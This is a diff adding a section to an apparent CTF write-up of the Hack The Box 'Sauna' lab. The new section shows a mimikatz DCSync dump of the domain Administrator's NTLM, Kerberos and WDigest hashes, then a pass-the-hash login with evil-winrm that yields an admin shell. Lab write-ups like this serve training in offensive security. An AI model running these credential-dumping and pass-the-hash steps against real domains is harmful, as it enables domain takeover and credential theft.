@@ -9,7 +9,9 @@ Level: Easy
 3. [Web Enumeration - Port 80](#Web%20Enumeration%20-%20Port%2080)
 4. [ASREPROAST Attack](#ASREPROAST%20Attack)
 5. [Capture the User Flag](#Capture%20the%20User%20Flag)
-6.  [Privilege Escalation](#Privilege%20Escalation) using winPEASany.exe
+6. [Privilege Escalation](#Privilege%20Escalation) using winPEASany.exe
+7. [Privilege Escalation using mimikatz](#Privilege%20Escalation%20using%20mimikatz)
+	7.1  [Using NTLM hash to get a shell using evil-winrm](#Using%20NTLM%20hash%20to%20get%20a%20shell%20using%20evil-winrm)
 
 ### Box Info
 ```
@@ -468,3 +470,125 @@ C:\Users\Administrator\Desktop> type root.txt
 ```
 
 Get your root flag. **Remember: The `impacket-psexec` worked here because the port 445 was open**. 
+
+### Privilege Escalation using mimikatz
+
+Okay now that we have our root flag, I am not pushing myself little harder to play with some other tools. This time, I am going to use mimikatz. But while solving this box, I was not able to `evil-winrm` into user `svc_loanmanager` but than I realized that the actual user on the system is `svc_loanmgr` when I was exploring the BloodHound result.
+So now I will get my `mimikatz.exe` on the `svc_loanmgr` user account and perform the DcSync attack using mimikatz. 
+
+Here is my output from the target host when running the mimikatz.exe
+```
+*Evil-WinRM* PS C:\temp> .\mimikatz.exe 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
+
+mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
+[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
+[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
+[DC] 'administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 7/26/2021 9:16:16 AM
+Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
+    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
+    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
+    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
+    lm  - 1: 7af65ae5e7103761ae828523c7713031
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 716dbadeed0e537580d5f8fb28780d44
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+      aes128_hmac       (4096) : a9f3769c592a8a231c3c972c4050be4e
+      des_cbc_md5       (4096) : fb8f321c64cea87f
+    OldCredentials
+      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
+      des_cbc_md5       (4096) : 19d5f15d689b1ce5
+    OlderCredentials
+      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
+      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
+      des_cbc_md5       (4096) : d9379d13f7c15d1c
+
+* Primary:Kerberos *
+    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : fb8f321c64cea87f
+    OldCredentials
+      des_cbc_md5       : 19d5f15d689b1ce5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  b4a06d28f92506a3a336d97a66b310fa
+    02  71efaf133c578bd7428bd2e1eca5a044
+    03  974acf4f67e4f609eb032fd9a72e8714
+    04  b4a06d28f92506a3a336d97a66b310fa
+    05  79ba561a664d78d6242748774e8475c5
+    06  f1188d8ed0ca1998ae828a60a8c6ac29
+    07  801ddc727db9fa3de98993d88a9ffa8b
+    08  a779e05da837dd2d303973304869ec0f
+    09  ac2c01846aebce4cbd4e3ec69b47a65d
+    10  6d863d6ae06c3addc49b7a453afe6fa0
+    11  a779e05da837dd2d303973304869ec0f
+    12  6676b9fdd4aa7f298f1ada64c044c230
+    13  5a01167d750636d66e5602db9aece9b7
+    14  f702282bd343c2fee7b98deac8950390
+    15  a099aa3c81f1affeba59d79a6533f60d
+    16  4bae84b8f0b0306788ff9bda4acb3bd4
+    17  976d547fb9e04b0ac5ec60508c275da1
+    18  50c302b71d0e08a1a2be14b56225645f
+    19  edb19e08653443695f6d3599e0a6bddf
+    20  c497465ddc6e2fc14cb0359d0d5de7f8
+    21  2ed0b4b57196fb190a66224b2b17029f
+    22  37d03051ae1cd6046975948564ab01fa
+    23  d4c7554fe1beb0ed712f50cfec470471
+    24  8df495fe69cdce409b9f04ea04289b9e
+    25  40788044be982310920cc0740687fefd
+    26  db7f66f1f1a8f46274d20cfdda5b6e1c
+    27  d70226ec52f1ef198c2e1e955a1da9b6
+    28  abdd681f875a9b3f3a50b36e51692a2c
+    29  dcd140a2ce2bf70fed7ac0e2b60d0dee
+
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+
+#### Using NTLM hash to get a shell using evil-winrm
+
+And from the Above NTLM hash, we can get the Admin shell using `evil-winrm`
+```
+# evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+egotisticalbank\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+```
